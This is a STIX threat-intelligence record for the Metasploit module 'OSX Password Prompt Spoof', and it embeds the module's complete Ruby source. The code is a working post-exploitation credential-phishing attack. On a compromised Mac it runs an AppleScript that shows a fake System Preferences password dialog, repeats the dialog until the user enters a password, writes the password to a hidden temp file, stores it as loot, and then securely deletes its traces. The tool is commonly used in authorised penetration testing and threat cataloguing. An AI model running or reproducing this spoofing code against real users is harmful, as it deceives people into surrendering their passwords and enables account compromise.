{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6d1eba10-c448-4075-8ecf-95e4d32f7408",
    "created": "2024-08-14T16:33:00.703577Z",
    "modified": "2024-08-14T16:33:00.703581Z",
    "name": "OSX Password Prompt Spoof",
    "description": " Presents a password prompt dialog to a logged-in OSX user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/password_prompt_spoof.rb",
            "external_id": "password_prompt_spoof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.packetheader.net/2011/10/fun-with-applescript.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Password Prompt Spoof',\n        'Description' => %q{\n          Presents a password prompt dialog to a logged-in OSX user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Joff Thyer <jsthyer[at]gmail.com>', # original post module\n          'joev', # bug fixes\n          'Peter Toth <globetother[at]gmail.com>' # bug fixes\n        ],\n        'Platform' => [ 'osx' ],\n        'References' => [\n          ['URL', 'http://blog.packetheader.net/2011/10/fun-with-applescript.html']\n        ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n\n    register_options([\n      OptString.new(\n        'TEXTCREDS',\n        [\n          true,\n          'Text displayed when asking for password',\n          'Type your password to allow System Preferences to make changes'\n        ]\n      ),\n      OptString.new(\n        'ICONFILE',\n        [\n          true,\n          'Icon filename relative to bundle',\n          'UserUnknownIcon.icns'\n        ]\n      ),\n      OptString.new(\n        'BUNDLEPATH',\n        [\n          true,\n          'Path to bundle containing icon',\n          '/System/Library/CoreServices/CoreTypes.bundle'\n        ]\n      ),\n      OptInt.new('TIMEOUT', [true, 'Timeout for user to enter credentials', 60])\n    ])\n  end\n\n  #  def cmd_exec(str, args)\n  #    print_status \"Running cmd '#{str} #{args}'...\"\n  #    super\n  #  end\n\n  # Run Method for when run command is issued\n  def run\n    if client.nil?\n      print_error(\"Invalid session ID selected. Make sure the host isn't dead.\")\n      return\n    end\n\n    host = case session.type\n           when /meterpreter/\n             sysinfo['Computer']\n           when /shell/\n             cmd_exec('/bin/hostname').chomp\n           end\n\n    print_status(\"Running module against #{host}\")\n\n    dir = '/tmp/.' + Rex::Text.rand_text_alpha((rand(6..13)))\n    creds_osa = dir + '/' + Rex::Text.rand_text_alpha((rand(6..13)))\n    pass_file = dir + '/' + Rex::Text.rand_text_alpha((rand(6..13)))\n\n    username = cmd_exec('/usr/bin/whoami').strip\n    cmd_exec('umask 0077')\n    cmd_exec(\"/bin/mkdir #{dir}\")\n\n    # write the credentials script and run\n    write_file(creds_osa, creds_script(pass_file))\n    cmd_exec(\"osascript #{creds_osa}\")\n\n    print_status(\"Waiting for user '#{username}' to enter credentials...\")\n\n    timeout = ::Time.now.to_f + datastore['TIMEOUT'].to_i\n    pass_found = false\n    while (::Time.now.to_f < timeout)\n      if file_exist?(pass_file)\n        print_status('Password entered! What a nice compliant user...')\n        pass_found = true\n        break\n      end\n      Rex.sleep(0.5)\n    end\n\n    if pass_found\n      password_data = read_file(pass_file.to_s).strip\n      print_good(\"password file contents: #{password_data}\")\n      passf = store_loot('password', 'text/plain', session, password_data, 'passwd.pwd', 'OSX Password')\n      print_good(\"Password data stored as loot in: #{passf}\")\n      pwd = password_data.split(':', 3)\n      pwd.shift # date\n      pwd.shift # username\n      create_credential({\n        workspace_id: myworkspace_id,\n        post_reference_name: refname,\n        private_data: pwd,\n        origin_type: :session,\n        session_id: session_db_id,\n        private_type: :password,\n        username: username\n      })\n    else\n      print_status('Timeout period expired before credentials were entered!')\n    end\n\n    print_status(\"Cleaning up files in #{host}: #{dir}\")\n    cmd_exec(\"/usr/bin/srm -rf #{dir}\")\n  end\n\n  # applescript that displays the actual password prompt dialog\n  def creds_script(pass_file)\n    textcreds = datastore['TEXTCREDS']\n    ascript = %(\nset filename to \"#{pass_file}\"\nset myprompt to \"#{textcreds}\"\nset ans to \"Cancel\"\nrepeat\n  try\n    set d_returns to display dialog myprompt default answer \"\" with hidden answer buttons {\"Cancel\", \"OK\"} default button \"OK\" with icon path to resource \"#{datastore['ICONFILE']}\" in bundle \"#{datastore['BUNDLEPATH']}\"\n    set ans to button returned of d_returns\n    set mypass to text returned of d_returns\n    if ans is equal to \"OK\" and mypass is not equal to \"\" then exit repeat\n  end try\nend repeat\ntry\n  set now to do shell script \"date '+%Y%m%d_%H%M%S'\"\n    set user to do shell script \"whoami\"\n  set myfile to open for access filename with write permission\n  set outstr to now & \":\" & user & \":\" & mypass & \"\n\"\n  write outstr to myfile starting at eof\n  close access myfile\non error\n  try\n    close access myfile\n  end try\nend try\n    )\n  end\n\n  # Checks if the target is OSX Server\n  def check_server\n    cmd_exec('/usr/bin/sw_vers -productName').chomp =~ /Server/\n  end\n\n  # Enumerate the OS Version\n  def get_ver\n    # Get the OS Version\n    cmd_exec('/usr/bin/sw_vers', '-productVersion').chomp\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}